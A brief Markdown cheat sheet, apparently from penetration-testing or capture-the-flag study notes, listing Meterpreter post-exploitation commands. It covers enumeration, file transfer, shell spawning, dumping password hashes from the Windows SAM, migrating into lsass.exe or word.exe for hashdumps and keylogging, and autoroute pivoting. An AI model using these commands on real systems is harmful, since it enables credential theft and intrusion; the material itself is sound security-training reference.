---
title: METERPRETER
---

## METERPRETER Enumeration


 > 
 > **<font color=red>sysinfo</font>**</br>
 > Info about the system.

 > 
 > **<font color=red>getuid</font>**</br>
 > Get current user.

 > 
 > **<font color=red>getenv</font>**</br>
 > Get one or more environment variable values.

 > 
 > **<font color=red>search -f</font>** flag.txt</br>
 > Search a file on the machine.

## METERPRETER File Upload


 > 
 > **<font color=red>upload</font>**</br>
 > Upload a file or directory.

 > 
 > **<font color=red>download</font>**</br>
 > Download a file or directory.

## METERPRETER Spawn Shell


 > 
 > **<font color=red>shell</font>**</br>
 > Spawn a shell.

 > 
 > **<font color=red>load powershell</font>**</br>
 > **<font color=red>powershell_shell</font>**</br>
 > Spawn Powershell.

## METERPRETER Attacks


 > 
 > **<font color=red>hashdump</font>**</br>
 > Dump hashes from Windows SAM base (for linux use module  linux/gather/hashdump). 

 > 
 > **<font color=red>migrate</font>** 716
 > Migrate to another process. 
 > Ex : Migrate to a word.exe and act like a keylogger.
 > Ex: Migrate to lsass.exe to run hashdump.

## METERPRETER Pivoting

When we have a meterpreter shell on a machine that has access to another network, we can use it to gain access to the 2nd network.

 > 
 > **<font color=red>run autoroute -s</font> \[REMOTE_NETWORK\]<font color=red>/24</font>**</br>
 > Create a route via the host that we had access to.

 > 
 > **<font color=red>run autoroute -p</font>**</br>
 > Show added routes.
